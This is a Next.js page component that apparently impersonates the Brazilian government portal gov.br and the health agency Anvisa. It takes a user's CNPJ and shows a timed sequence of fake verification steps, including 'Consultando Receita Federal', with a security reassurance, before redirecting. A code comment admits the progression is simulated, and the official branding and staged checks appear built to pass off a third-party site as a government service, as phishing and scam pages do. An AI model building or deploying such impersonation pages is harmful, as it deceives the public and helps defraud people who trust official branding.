"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Bell, User } from "lucide-react"

export default function PreLoadingPage() {
  const router = useRouter()
  const [currentStep, setCurrentStep] = useState(0)
  const [cnpjData, setCnpjData] = useState(null)
  const [error, setError] = useState("")

  const steps = [
    { text: "Conectando com a base de dados", completed: false },
    { text: "Consultando Receita Federal", completed: false },
    { text: "Validando informações pessoais", completed: false },
    { text: "Preparando resultado", completed: false },
  ]

  useEffect(() => {
    // Check if CNPJ exists in session storage
    const cnpj = sessionStorage.getItem("cnpj")
    if (!cnpj) {
      router.push("/")
      return
    }

    console.log("[v0] Starting CNPJ consultation for:", cnpj)

    const fetchCnpjData = async () => {
      try {
        const response = await fetch(`/api/cnpj?cnpj=${encodeURIComponent(cnpj)}`)
        const data = await response.json()

        if (!response.ok) {
          throw new Error(data.error || "Erro ao consultar CNPJ")
        }

        console.log("[v0] CNPJ data received:", data)
        setCnpjData(data)
        // Store the fetched data for use in results page
        sessionStorage.setItem("cnpjData", JSON.stringify(data))
      } catch (err) {
        console.error("[v0] Error fetching CNPJ:", err)
        setError(err instanceof Error ? err.message : "Erro desconhecido")
      }
    }

    // Start fetching data immediately
    fetchCnpjData()

    // Simulate step progression
    const stepInterval = setInterval(() => {
      setCurrentStep((prev) => {
        if (prev < steps.length - 1) {
          return prev + 1
        } else {
          clearInterval(stepInterval)
          // After all steps complete, wait a bit then redirect to main loading
          setTimeout(() => {
            router.push("/loading")
          }, 1500)
          return prev
        }
      })
    }, 2000) // Increased interval to allow time for API call

    return () => clearInterval(stepInterval)
  }, [router])

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header - Simple version without user profile */}
      <header className="bg-white border-b border-gray-200 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <img src="/images/govbr-logo-large-CK1AxAnO.png" alt="gov.br" className="h-8" />
              <div className="hidden sm:block">
                <h1 className="text-lg font-semibold text-gray-900">Anvisa</h1>
                <p className="text-sm text-gray-600">Ministério da Saúde</p>
              </div>
            </div>

            <div className="flex items-center space-x-4">
              <button className="p-2 text-gray-600 hover:text-gray-900 relative">
                <Bell className="w-5 h-5" />
              </button>
              <div className="hidden md:block text-right">
                <p className="text-sm font-medium text-gray-900">Sistema</p>
                <p className="text-xs text-gray-600">gov.br</p>
              </div>
              <div className="w-10 h-10 rounded-full bg-gradient-to-r from-blue-500 to-indigo-600 flex items-center justify-center text-white font-semibold">
                <User className="w-5 h-5" />
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex items-center justify-center min-h-[calc(100vh-4rem)] p-4">
        <div className="max-w-md w-full text-center">
          {/* Gov.br Logo */}
          <div className="mb-8">
            <div className="inline-flex items-center justify-center w-24 h-24 bg-white rounded-full shadow-lg mb-6">
              <img src="/images/govbr-logo-large-CK1AxAnO.png" alt="gov.br" className="h-12" />
            </div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">Anvisa</h1>
            <p className="text-gray-600">Ministério da Saúde do Brasil</p>
          </div>

          {/* Loading Spinner */}
          <div className="mb-8">
            <div className="inline-flex items-center justify-center w-16 h-16 mb-6">
              <div className="animate-spin rounded-full h-12 w-12 border-4 border-blue-200 border-t-blue-600"></div>
            </div>
          </div>

          {/* Main Text */}
          <div className="mb-8">
            <h2 className="text-xl font-semibold text-gray-900 mb-2">Consultando seus dados na Receita Federal</h2>
            <p className="text-gray-600">Por favor, aguarde enquanto verificamos seus dados..</p>
            {error && (
              <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-sm text-red-600">{error}</p>
              </div>
            )}
          </div>

          {/* Progress Steps */}
          <div className="space-y-4 mb-8">
            {steps.map((step, index) => (
              <div key={index} className="flex items-center justify-center space-x-3">
                <div
                  className={`w-3 h-3 rounded-full transition-colors duration-500 ${
                    index <= currentStep
                      ? index === steps.length - 1 && currentStep === steps.length - 1
                        ? "bg-green-500"
                        : "bg-blue-500"
                      : "bg-gray-300"
                  }`}
                />
                <span
                  className={`text-sm transition-colors duration-500 ${
                    index <= currentStep ? "text-gray-900" : "text-gray-500"
                  }`}
                >
                  {step.text}
                </span>
              </div>
            ))}
          </div>

          {/* Security Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <div className="flex items-center justify-center space-x-2">
              <div className="w-4 h-4 rounded-full bg-blue-500 flex items-center justify-center">
                <div className="w-2 h-2 rounded-full bg-white"></div>
              </div>
              <p className="text-sm text-blue-800">
                Seus dados estão sendo processados de forma segura e confidencial.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
